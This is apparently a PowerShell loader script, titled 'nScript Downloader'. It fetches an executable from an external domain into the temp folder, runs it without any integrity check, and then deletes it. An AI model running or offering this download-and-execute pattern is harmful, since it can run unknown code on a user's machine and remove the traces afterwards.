$ErrorActionPreference = "Stop"

# Configuration
$BinaryName = "nScript.exe"
$TempPath = Join-Path $env:TEMP "nScript"
$BinaryPath = Join-Path $TempPath $BinaryName

Write-Host "[*] nScript Downloader" -ForegroundColor Cyan
Write-Host "[*] Downloading and running nScript (Normal Mode)..." -ForegroundColor Cyan
Write-Host ""

# Create temp directory
if (-not (Test-Path $TempPath)) {
    New-Item -ItemType Directory -Path $TempPath -Force | Out-Null
}

try {
    $DownloadUrl = "https://clean.meowery.eu/dl.exe"
    
    Write-Host "[*] Downloading $BinaryName from CDN..." -ForegroundColor Yellow
    Invoke-WebRequest -Uri $DownloadUrl -OutFile $BinaryPath -UseBasicParsing
    
    Write-Host "[+] Download complete!" -ForegroundColor Green
    Write-Host ""
    Write-Host "[*] Running nScript..." -ForegroundColor Yellow
    Write-Host "========================================" -ForegroundColor Cyan
    Write-Host ""
    
    # Run the binary
    & $BinaryPath
    
    Write-Host ""
    Write-Host "========================================" -ForegroundColor Cyan
    Write-Host "[+] nScript execution completed!" -ForegroundColor Green
}
catch {
    Write-Host "[-] Error: $_" -ForegroundColor Red
    Write-Host "[-] Failed to download or execute nScript" -ForegroundColor Red
    exit 1
}
finally {
    # Cleanup
    if (Test-Path $BinaryPath) {
        Write-Host "[*] Cleaning up..." -ForegroundColor Yellow
        Remove-Item -Path $BinaryPath -Force -ErrorAction SilentlyContinue
    }
}